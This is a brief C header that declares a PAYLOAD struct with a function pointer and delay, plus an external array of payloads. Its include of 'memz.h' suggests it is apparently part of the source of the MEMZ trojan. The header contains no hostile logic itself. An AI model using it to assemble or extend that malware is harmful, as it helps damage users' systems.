#pragma once
#include "memz.h"

typedef struct {
	int(*payloadFunction)(int, int);
	int delay;
} PAYLOAD;

#define PAYLOADFUNC int times, int runtime
#define PAYLOADHEAD

extern PAYLOAD payloads[];
extern const size_t nPayloads;